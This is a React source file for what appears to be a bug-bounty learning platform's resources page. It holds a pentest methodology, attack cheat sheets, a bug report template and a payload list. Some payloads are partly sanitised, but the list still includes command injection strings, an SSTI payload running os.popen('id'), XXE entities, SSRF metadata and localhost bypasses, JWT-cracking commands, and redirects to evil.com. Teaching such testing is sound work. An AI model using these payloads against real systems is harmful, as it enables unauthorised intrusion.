import { useLanguage } from '../i18n/LanguageContext';
import { faLabel } from '../utils/localizeContent';
import { useAppStore } from '../store/useAppStore';
import { BookOpen, Target, FileText, Code2, ChevronRight, ExternalLink } from 'lucide-react';

const methodology = [
  {
    step: 1,
    phase: 'Reconnaissance',
    icon: '🔍',
    color: 'blue',
    techniques: [
      'Passive recon: OSINT, Shodan, Censys, Google Dorks',
      'Active recon: Nmap, Masscan port scanning',
      'Subdomain enumeration: Subfinder, Amass, Assetfinder',
      'Directory/file discovery: Feroxbuster, Gobuster, ffuf',
      'Technology fingerprinting: Wappalyzer, WhatWeb',
      'GitHub recon: secrets in source code, API keys',
      'DNS enumeration: Zone transfers, DNSX',
    ],
    tools: ['subfinder', 'amass', 'nmap', 'ffuf', 'shodan']
  },
  {
    step: 2,
    phase: 'Enumeration',
    icon: '📊',
    color: 'purple',
    techniques: [
      'Parameter discovery with Arjun or Burp Param Miner',
      'API endpoint discovery via Swagger, Postman collections',
      'Authentication mechanism analysis (JWT, OAuth, sessions)',
      'WAF detection and fingerprinting',
      'Business logic mapping: user flows, permissions',
      'Source code review (if available): leaked JS, secrets',
    ],
    tools: ['arjun', 'burp-suite', 'postman', 'wafw00f']
  },
  {
    step: 3,
    phase: 'Exploitation',
    icon: '💥',
    color: 'red',
    techniques: [
      'OWASP Top 10 testing methodology',
      'Injection testing: SQLi, XSS, SSTI, XXE, SSRF, NoSQLi',
      'Authentication bypass: default creds, brute force, JWT attacks',
      'Authorization testing: IDOR, privilege escalation, path traversal',
      'Business logic: negative values, workflow bypasses, race conditions',
      'Client-side attacks: CSRF, Clickjacking, XSS via DOM',
    ],
    tools: ['sqlmap', 'dalfox', 'commix', 'jwt_tool']
  },
  {
    step: 4,
    phase: 'Post-Exploitation',
    icon: '🎯',
    color: 'orange',
    techniques: [
      'Demonstrate impact: data exfiltration, account takeover PoC',
      'Internal network pivoting (if in scope)',
      'Sensitive data access demonstration',
      'Screenshot evidence and request/response capture',
      'Impact severity assessment using CVSS',
    ],
    tools: ['burp-suite', 'curl', 'python']
  },
  {
    step: 5,
    phase: 'Reporting',
    icon: '📝',
    color: 'green',
    techniques: [
      'Clear vulnerability title with CWE reference',
      'Severity rating with CVSS v3.1 score',
      'Step-by-step reproduction instructions',
      'Impact description (what attacker can do)',
      'Screenshots, HTTP requests, video PoC',
      'Remediation recommendations with code examples',
    ],
    tools: ['markdown', 'jira', 'hackerone']
  }
];

const cheatSheets = [
  {
    title: 'SQLi Cheat Sheet',
    icon: '🗄️',
    items: [
      'Detection: compare benign true/false training probes',
      'Error-based: use redacted database-error markers only in labs',
      'Union-based: align column count with redacted values',
      'Blind timing: compare baseline and delayed lab responses',
      'Database-specific behavior: verify only in an authorized sandbox',
      'SQLMap: use only against targets you own or have explicit permission to test',
    ]
  },
  {
    title: 'XSS Cheat Sheet',
    icon: '💉',
    items: [
      'Basic: use a harmless encoded training marker',
      'Event handlers: test with redacted callbacks',
      'SVG contexts: validate with non-executing markers',
      "DOM: location.hash, innerHTML, document.write",
      "CSP bypass: <base href=attacker.com>",
      "Stored: persist payload in comments/profile fields",
    ]
  },
  {
    title: 'SSRF Targets',
    icon: '🌐',
    items: [
      "AWS metadata: http://metadata.training.local/",
      "GCP metadata: http://metadata.google.internal/",
      "Azure: http://metadata.training.local/metadata/",
      "Internal: http://localhost:8080/admin",
      "Cloud functions: http://127.0.0.1:8080/",
      "Bypass: http://0x7f000001/ | http://127.1/",
    ]
  },
  {
    title: 'JWT Attacks',
    icon: '🎫',
    items: [
      'alg:none: remove signature, set alg to "none"',
      'Weak secret: hashcat -m 16500 jwt.txt wordlist.txt',
      'Algorithm confusion: RS256 → HS256 with public key',
      'jwk injection: embed malicious JWK in header',
      'kid injection: path traversal in kid parameter',
      'Tool: python3 jwt_tool.py TOKEN -X a',
    ]
  },
];

const payloads = [
  { category: 'Path Traversal', payloads: ['../../../safe/training/file.txt', '%2e%2e%2f%2e%2e%2f', '....//....//....//safe/training/file.txt', '%252e%252e%252f', '..%c0%af..%c0%af'] },
  { category: 'Command Injection', payloads: ['; whoami', '| id', '&& cat /safe/training/file.txt', '`id`', '$(whoami)', '; sleep 5'] },
  { category: 'XXE', payloads: ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///safe/training/file.txt">]><foo>&xxe;</foo>', '<!ENTITY xxe SYSTEM "http://internal.host/">'] },
  { category: 'SSTI', payloads: ['{{7*7}}', '${7*7}', '#{7*7}', '<%= 7*7 %>', '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}'] },
  { category: 'NoSQL', payloads: ['{"$ne": null}', '{"$regex": ".*"}', '{"$gt": ""}', '{"$where": "1==1"}', '[$ne]=x'] },
  { category: 'Open Redirect', payloads: ['//evil.com', '/\\evil.com', 'https://evil.com', 'javascript:alert(1)', '%0d%0a//evil.com'] },
];

const reportTemplate = `# Bug Report: [Vulnerability Type] in [Feature]

## Summary
Brief description of the vulnerability.

## Severity
**Critical / High / Medium / Low**
CVSS Score: X.X (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Affected URL
\`\`\`
https://target.com/vulnerable/endpoint?param=value
\`\`\`

## Vulnerability Details
Describe what the vulnerability is and why it exists.

## Steps to Reproduce
1. Log in to the application
2. Navigate to [page]
3. Send the following request:
\`\`\`http
POST /api/endpoint HTTP/1.1
Host: target.com
Content-Type: application/json

{"field": "malicious_payload"}
\`\`\`
4. Observe the response: [expected vs actual]

## Proof of Concept
[Attach screenshot or video]
[Include request/response]

## Impact
What can an attacker do with this vulnerability?
- Example: An unauthenticated attacker can read all user data
- Example: Account takeover without password
- Business impact: [financial loss, data breach, etc.]

## Remediation
- Use parameterized queries / prepared statements
- Implement proper input validation
- Apply the principle of least privilege
- Reference: [OWASP link]

## References
- [CVE or CWE reference]
- [PortSwigger or OWASP link]`;

export function Resources() {
  const { locale } = useLanguage();
  const tx = (value: string, replacements: Record<string, string | number> = {}) => locale === 'fa' ? faLabel(value, replacements) : Object.entries(replacements).reduce((text, [key, replacement]) => text.replaceAll(`{{${key}}}`, String(replacement)), value);
  const { darkMode } = useAppStore();

  return (
    <div className={`min-h-screen ${darkMode ? 'bg-slate-950' : 'bg-slate-50'}`}>
      <div className={`border-b ${darkMode ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'}`}>
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-10">
          <div className="flex items-center gap-3 mb-3">
            <div className="w-10 h-10 bg-gradient-to-br from-cyan-500 to-blue-600 rounded-xl flex items-center justify-center">
              <BookOpen size={20} className="text-white" />
            </div>
            <h1 className={`text-3xl font-black ${darkMode ? 'text-white' : 'text-slate-900'}`}>{tx('Resources')}</h1>
          </div>
          <p className={`text-base ${darkMode ? 'text-slate-400' : 'text-slate-500'}`}>
            {tx('Methodology, templates, cheat sheets, and payload references')}
          </p>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-12">

        {/* Bug Bounty Methodology */}
        <section>
          <div className="flex items-center gap-2 mb-6">
            <Target size={20} className="text-green-400" />
            <h2 className={`text-xl font-bold ${darkMode ? 'text-white' : 'text-slate-900'}`}>{tx('Bug Bounty Methodology')}</h2>
          </div>
          <div className="space-y-4">
            {methodology.map((phase) => (
              <div key={phase.step} className={`p-6 rounded-2xl border ${darkMode ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'}`}>
                <div className="flex items-start gap-4">
                  <div className={`w-12 h-12 rounded-xl bg-slate-700 flex items-center justify-center shrink-0 text-xl`}>
                    {phase.icon}
                  </div>
                  <div className="flex-1">
                    <div className="flex items-center gap-3 mb-3">
                      <span className={`text-xs font-bold uppercase tracking-wider ${darkMode ? 'text-slate-500' : 'text-slate-400'}`}>{tx('Step')} {phase.step}</span>
                      <h3 className={`font-bold text-lg ${darkMode ? 'text-white' : 'text-slate-900'}`}>{tx(phase.phase)}</h3>
                    </div>
                    <ul className="grid grid-cols-1 sm:grid-cols-2 gap-2 mb-4">
                      {phase.techniques.map((t, i) => (
                        <li key={i} className={`flex items-start gap-2 text-sm ${darkMode ? 'text-slate-300' : 'text-slate-600'}`}>
                          <ChevronRight size={14} className="text-green-400 shrink-0 mt-0.5" />
                          {tx(t)}
                        </li>
                      ))}
                    </ul>
                    <div className="flex flex-wrap gap-2">
                      {phase.tools.map(tool => (
                        <span key={tool} className={`technical-ltr text-xs px-2 py-1 rounded-lg font-mono ${darkMode ? 'bg-slate-800 text-slate-300' : 'bg-slate-100 text-slate-600'}`}>{tool}</span>
                      ))}
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </section>

        {/* Cheat Sheets */}
        <section>
          <div className="flex items-center gap-2 mb-6">
            <Code2 size={20} className="text-blue-400" />
            <h2 className={`text-xl font-bold ${darkMode ? 'text-white' : 'text-slate-900'}`}>{tx('Cheat Sheets')}</h2>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {cheatSheets.map(sheet => (
              <div key={sheet.title} className={`p-5 rounded-2xl border ${darkMode ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'}`}>
                <h3 className={`font-bold mb-4 flex items-center gap-2 ${darkMode ? 'text-white' : 'text-slate-900'}`}>
                  <span>{sheet.icon}</span> {tx(sheet.title)}
                </h3>
                <ul className="space-y-2">
                  {sheet.items.map((item, i) => (
                    <li key={i} className={`technical-ltr text-xs font-mono p-2 rounded-lg ${darkMode ? 'bg-slate-800 text-green-300' : 'bg-slate-100 text-green-700'}`}>
                      {tx(item)}
                    </li>
                  ))}
                </ul>
              </div>
            ))}
          </div>
        </section>

        {/* Payload Lists */}
        <section>
          <div className="flex items-center gap-2 mb-6">
            <Code2 size={20} className="text-purple-400" />
            <h2 className={`text-xl font-bold ${darkMode ? 'text-white' : 'text-slate-900'}`}>{tx('Payload Reference')}</h2>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {payloads.map(section => (
              <div key={section.category} className={`p-5 rounded-2xl border ${darkMode ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'}`}>
                <h3 className={`font-bold mb-3 text-sm ${darkMode ? 'text-slate-300' : 'text-slate-700'}`}>{tx(section.category)}</h3>
                <div className="space-y-1.5">
                  {section.payloads.map((p, i) => (
                    <code key={i} className={`technical-ltr block text-xs px-3 py-2 rounded-lg font-mono break-all ${darkMode ? 'bg-slate-800 text-blue-300' : 'bg-slate-100 text-blue-700'}`}>
                      {p}
                    </code>
                  ))}
                </div>
              </div>
            ))}
          </div>
        </section>

        {/* Bug Report Template */}
        <section>
          <div className="flex items-center gap-2 mb-6">
            <FileText size={20} className="text-orange-400" />
            <h2 className={`text-xl font-bold ${darkMode ? 'text-white' : 'text-slate-900'}`}>{tx('Bug Report Template')}</h2>
          </div>
          <div className={`rounded-2xl border overflow-hidden ${darkMode ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'}`}>
            <div className={`flex items-center justify-between px-6 py-4 border-b ${darkMode ? 'border-slate-800 bg-slate-800' : 'border-slate-200 bg-slate-50'}`}>
              <span className={`text-sm font-semibold ${darkMode ? 'text-slate-300' : 'text-slate-700'}`}>vulnerability-report.md</span>
              <button
                onClick={() => navigator.clipboard?.writeText(reportTemplate)}
                className="text-xs text-green-400 hover:text-green-300 flex items-center gap-1">
                {tx('Copy Template')}
              </button>
            </div>
            <pre className={`technical-ltr p-6 text-xs font-mono leading-relaxed overflow-x-auto whitespace-pre ${darkMode ? 'text-slate-300' : 'text-slate-700'}`}>
              {locale === 'fa' ? tx(reportTemplate) : reportTemplate}
            </pre>
          </div>
        </section>

        {/* External Resources */}
        <section>
          <div className="flex items-center gap-2 mb-6">
            <ExternalLink size={20} className="text-teal-400" />
            <h2 className={`text-xl font-bold ${darkMode ? 'text-white' : 'text-slate-900'}`}>{tx('External Resources')}</h2>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
            {[
              { name: 'PortSwigger Web Academy', desc: 'Free web security training labs', url: 'https://portswigger.net/web-security', emoji: '🎓' },
              { name: 'OWASP Testing Guide', desc: 'Comprehensive web security testing methodology', url: 'https://owasp.org/www-project-web-security-testing-guide/', emoji: '📋' },
              { name: 'HackTricks', desc: 'CTF and penetration testing tricks', url: 'https://book.hacktricks.xyz', emoji: '🃏' },
              { name: 'PayloadsAllTheThings', desc: 'Huge list of security payloads', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings', emoji: '💥' },
              { name: 'Bug Bounty Tips', desc: 'Community bug bounty tips and tricks', url: 'https://github.com/KathanP19/HowToHunt', emoji: '🎯' },
              { name: 'SecLists', desc: 'Security-focused wordlists', url: 'https://github.com/danielmiessler/SecLists', emoji: '📝' },
            ].map(r => (
              <a
                key={r.name}
                href={r.url}
                target="_blank"
                rel="noopener noreferrer"
                className={`flex items-start gap-3 p-4 rounded-xl border transition-all hover:scale-[1.02] ${
                  darkMode ? 'bg-slate-900 border-slate-800 hover:border-teal-500/40' : 'bg-white border-slate-200 hover:border-teal-400 hover:shadow-md'
                }`}>
                <span className="text-2xl">{r.emoji}</span>
                <div>
                  <div className={`font-semibold text-sm mb-0.5 ${darkMode ? 'text-white' : 'text-slate-900'}`}>{tx(r.name)}</div>
                  <div className={`text-xs ${darkMode ? 'text-slate-400' : 'text-slate-500'}`}>{tx(r.desc)}</div>
                </div>
              </a>
            ))}
          </div>
        </section>
      </div>
    </div>
  );
}
